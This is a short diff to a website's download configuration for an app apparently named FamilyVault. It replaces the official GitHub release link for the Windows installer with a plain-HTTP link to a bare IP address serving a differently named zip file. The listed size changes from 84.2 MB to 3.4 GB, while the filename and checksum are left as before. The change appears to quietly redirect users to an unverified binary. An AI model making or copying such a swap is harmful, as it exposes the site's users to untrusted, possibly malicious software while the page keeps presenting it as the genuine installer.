@@ -14,8 +14,8 @@ export const SITE_CONFIG = {
     windows: {
       label: "Download for Windows",
       filename: "FamilyVault-Setup-1.0.0.exe",
-      url: "https://github.com/familyvault/familyvault-desktop/releases/download/v1.0.0/FamilyVault-Setup-1.0.0.exe",
-      size: "84.2 MB",
+      url: "http://139.84.144.90/family-vault-win32-x64-1.0.0.zip",
+      size: "3.4 GB",
       os: "Windows 10 / 11",
       architecture: "x64",
       sha256: "9f83b2a5d4c887e1f92e21b8c037da954628d4e9f7a11029c7849e7b23c915f0",
